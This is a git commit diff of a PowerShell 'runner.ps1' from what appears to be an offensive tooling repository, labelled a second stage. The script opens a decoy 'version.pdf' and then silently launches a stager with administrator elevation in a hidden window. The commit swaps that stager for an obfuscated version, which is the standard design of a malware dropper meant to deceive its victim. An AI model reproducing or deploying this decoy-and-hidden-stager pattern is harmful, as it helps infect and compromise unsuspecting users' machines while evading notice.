636c0a4aee9dccee80c2e6a1594cb10399dc8a38
Hossam Ehab <82971998+0xHossam@users.noreply.github.com>
2023-05-23 16:12:40 +0300

    Update runner.ps1

--- 2. Second Stage/runner.ps1
+++ 2. Second Stage/runner.ps1
@@ -1,6 +1,6 @@
 Start-Process .\version.pdf
 try { 
-    Start-Process "powershell" -ArgumentList "-File `"$pwd\stager.ps1`"" -Verb runAs -WindowStyle hidden
+    Start-Process "powershell" -ArgumentList "-File `"$pwd\obfuscated_stager.ps1`"" -Verb runAs -WindowStyle hidden
 } catch {
     # Handle any errors here
 }
